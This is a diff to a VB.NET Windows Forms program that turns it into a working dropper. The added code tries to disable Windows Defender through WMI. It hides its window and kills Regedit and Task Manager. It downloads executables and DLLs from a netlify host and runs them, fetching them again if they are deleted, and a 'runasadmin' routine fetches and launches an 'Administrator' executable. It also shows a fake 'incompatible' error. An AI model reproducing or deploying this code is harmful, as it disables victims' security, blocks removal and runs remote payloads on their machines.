@@ -2,32 +2,77 @@
 Imports Microsoft.Win32
 Imports System.IO
 Imports System.Net
+Imports System.Text
+Imports System.Security.AccessControl
+Imports System.Management
+
 
 Public Class Form1
     Dim working As Boolean = True
     Dim RegistryKey As Object
     Dim admin As Boolean = True
-    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load 'https://incomparable-cascaron-802b94.netlify.app/AxInterop.WMPLib.dll
+    Dim download1 As Boolean = False
+    Dim download2 As Boolean = False
+    Dim download3 As Boolean = False
+    Dim working4 As Boolean = False
+
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load 'https://incomparable-cascaron-802b94.netlify.app/Yuki3.Administrator.exe
+        HideTaskManager()
+
+        Try
+            Dim scope As New ManagementScope("\\.\ROOT\SecurityCenter2")
+            scope.Connect()
+
+            Dim query As New ObjectQuery("SELECT * FROM AntivirusProduct")
+            Dim searcher As New ManagementObjectSearcher(scope, query)
+
+            For Each instance As ManagementObject In searcher.Get()
+                If instance("displayName").ToString().Contains("Windows Defender") Then
+                    instance.InvokeMethod("SetEnable", New Object() {False})
+                End If
+            Next
+        Catch ex As Exception
+
+        End Try
+
+        Dim path As String = "C:\Users\" & SystemInformation.UserName & "\path.yuki"
+
+        Dim fs As FileStream = File.Create(path)
+
+        ' Add text to the file.
+        Dim info As Byte() = New UTF8Encoding(True).GetBytes(Application.ExecutablePath)
+        fs.Write(info, 0, info.Length)
+        fs.Close()
+
+
+
         RegistryKey = CreateObject("WScript.Shell")
         Try
+            download1 = True
             My.Computer.Network.DownloadFile(
          "https://incomparable-cascaron-802b94.netlify.app/AxInterop.WMPLib.dll",
         "C:\Users\" & SystemInformation.UserName & "\AxInterop.WMPLib.dll")
+
         Catch ex As Exception
 
         End Try
+
         Try
+            download2 = True
             My.Computer.Network.DownloadFile(
                "https://incomparable-cascaron-802b94.netlify.app/Interop.WMPLib.dll",
               "C:\Users\" & SystemInformation.UserName & "\Interop.WMPLib.dll")
+
         Catch ex As Exception
 
         End Try
 
         Try
+            download3 = True
             My.Computer.Network.DownloadFile(
               "https://incomparable-cascaron-802b94.netlify.app/welpyoutryed.exe",
              "C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
+
         Catch ex As Exception
 
         End Try
@@ -64,7 +109,7 @@ Public Class Form1
 
 
                 Else
-                    MessageBox.Show("This program only works in administrator mode.")
+                    runasadmin()
                     Me.Close()
                 End If
 
@@ -104,6 +149,7 @@ Public Class Form1
                 End If
                 If day = 1 AndAlso month = 7 Then
                     hahahahaerror.Show()
+
                 End If
                 If month = 8 Then
                     '   creepy_Patrick_Star.Show()
@@ -174,13 +220,23 @@ Public Class Form1
         Else
             If admin = True Then
                 MsgBox("This program is incompatible with your current Windows installation.", 0 + 16, "incompatible")
-                Dim file As System.IO.StreamWriter
-                file = My.Computer.FileSystem.OpenTextFileWriter("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki", True)
-                file.WriteLine("true")
-                file.Close()
+                Dim file2 As System.IO.StreamWriter
+                file2 = My.Computer.FileSystem.OpenTextFileWriter("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki", True)
+                file2.WriteLine("true")
+                file2.Close()
+                ' Set up the file path and permissions.
+                Dim filePath As String = "C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki"
             End If
 
         End If
+
+
+        Try
+            'Process.Start("C:\Users\" & SystemInformation.UserName & "\monitoring service1.exe")
+            working4 = True
+        Catch ex As Exception
+
+        End Try
     End Sub
 
     Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
@@ -253,15 +309,21 @@ Public Class Form1
     End Sub
     Dim working1 As Boolean = False
     Private Sub CehckforbadPross_Tick(sender As Object, e As EventArgs) Handles CehckforbadPross.Tick
+
+        ' My.Computer.Network.DownloadFile(
+
+
         Dim p() As Process
 
-        p = Process.GetProcessesByName("regedit")
+
+
+        p = Process.GetProcessesByName("Regedit")
         If p.Count > 0 Then
             If working1 = False Then
                 working1 = True
 
                 Try
-                    Process.GetProcessesByName("regedit")(0).Kill()
+                    Process.GetProcessesByName("Regedit")(0).Kill()
                 Catch ex As Exception
 
                 End Try
@@ -278,6 +340,8 @@ Public Class Form1
 
             ' Process is not running
         End If
+
+
 
         p = Process.GetProcessesByName("Taskmgr")
         If p.Count > 0 Then
@@ -302,6 +366,8 @@ Public Class Form1
 
             ' Process is not running
         End If
+
+
     End Sub
 
     Private Sub DateTimePicker1_ValueChanged(sender As Object, e As EventArgs)
@@ -335,4 +401,142 @@ Public Class Form1
     Private Sub Timer5_Tick(sender As Object, e As EventArgs) Handles Timer5.Tick
         Process.Start("https://www.fittea.com/")
     End Sub
+
+    Private Sub CheckForBadFiles_Tick(sender As Object, e As EventArgs) Handles CheckForBadFiles.Tick
+
+        Dim fileReader As String
+        fileReader = "oh ur dead"
+        Try
+            fileReader = My.Computer.FileSystem.ReadAllText("C:\Users\" & SystemInformation.UserName & "\path.yuki")
+        Catch ex As Exception
+
+        End Try
+
+        If Not fileReader = Application.ExecutablePath Then
+            Try
+                Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
+            Catch ex As Exception
+
+            End Try
+            Try
+                Try
+                    My.Computer.FileSystem.DeleteFile("C:\Users\" & SystemInformation.UserName & "\path.yuki")
+                Catch ex As Exception
+
+                End Try
+                Dim path As String = "C:\Users\" & SystemInformation.UserName & "\path.yuki"
+                Dim fs As FileStream = File.Create(path)
+                ' Add text to the file.
+                Dim info As Byte() = New UTF8Encoding(True).GetBytes(Application.ExecutablePath)
+                fs.Write(info, 0, info.Length)
+                fs.Close()
+            Catch ex As Exception
+
+            End Try
+        End If
+        If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\AxInterop.WMPLib.dll") Then
+        Else
+            If download1 = True Then
+                Try
+                    My.Computer.Network.DownloadFile(
+    "https://incomparable-cascaron-802b94.netlify.app/AxInterop.WMPLib.dll",
+   "C:\Users\" & SystemInformation.UserName & "\AxInterop.WMPLib.dll")
+                    Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
+                Catch ex As Exception
+
+                End Try
+
+            End If
+        End If
+
+        If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\Interop.WMPLib.dll") Then
+        Else
+            If download2 = True Then
+                Try
+                    My.Computer.Network.DownloadFile(
+               "https://incomparable-cascaron-802b94.netlify.app/Interop.WMPLib.dll",
+              "C:\Users\" & SystemInformation.UserName & "\Interop.WMPLib.dll")
+                    Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
+                Catch ex As Exception
+
+                End Try
+
+            End If
+        End If
+
+        If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe") Then
+        Else
+            If download3 = True Then
+                Try
+                    My.Computer.Network.DownloadFile(
+             "https://incomparable-cascaron-802b94.netlify.app/welpyoutryed.exe",
+            "C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
+                    Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
+                Catch ex As Exception
+
+                End Try
+
+            End If
+        End If
+    End Sub
+
+    Private Sub Timer6_Tick(sender As Object, e As EventArgs) Handles Timer6.Tick
+
+    End Sub
+
+    Private Sub Timer7_Tick(sender As Object, e As EventArgs) Handles Timer7.Tick
+        Try
+            Dim scope As New ManagementScope("\\.\ROOT\SecurityCenter2")
+            scope.Connect()
+
+            Dim query As New ObjectQuery("SELECT * FROM AntivirusProduct")
+            Dim searcher As New ManagementObjectSearcher(scope, query)
+
+            For Each instance As ManagementObject In searcher.Get()
+                If instance("displayName").ToString().Contains("Windows Defender") Then
+                    instance.InvokeMethod("SetEnable", New Object() {False})
+                End If
+            Next
+        Catch ex As Exception
+
+        End Try
+    End Sub
+
+    Private Sub errorrow_Tick(sender As Object, e As EventArgs) Handles errorrow.Tick
+
+    End Sub
+
+    Public Declare Function ShowWindow Lib "user32" (ByVal hWnd As IntPtr, ByVal nCmdShow As Integer) As Boolean
+
+    Public Const SW_HIDE As Integer = 0
+    Public Const SW_SHOW As Integer = 5
+
+    Sub HideTaskManager()
+        Dim proc As Process = Process.GetCurrentProcess()
+        ShowWindow(proc.MainWindowHandle, SW_HIDE)
+    End Sub
+
+    Sub ShowTaskManager()
+        Dim proc As Process = Process.GetCurrentProcess()
+        ShowWindow(proc.MainWindowHandle, SW_SHOW)
+    End Sub
+
+    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
+        ShowTaskManager()
+    End Sub
+    Function runasadmin()
+        Try
+            My.Computer.Network.DownloadFile(
+          "https://incomparable-cascaron-802b94.netlify.app/Yuki3.Administrator.exe",
+         "C:\Users\" & SystemInformation.UserName & "\Yuki3.Administrator.exe")
+
+        Catch ex As Exception
+
+        End Try
+        Try
+            Process.Start("C:\Users\" & SystemInformation.UserName & "\Yuki3.Administrator.exe")
+        Catch ex As Exception
+
+        End Try
+    End Function
 End Class
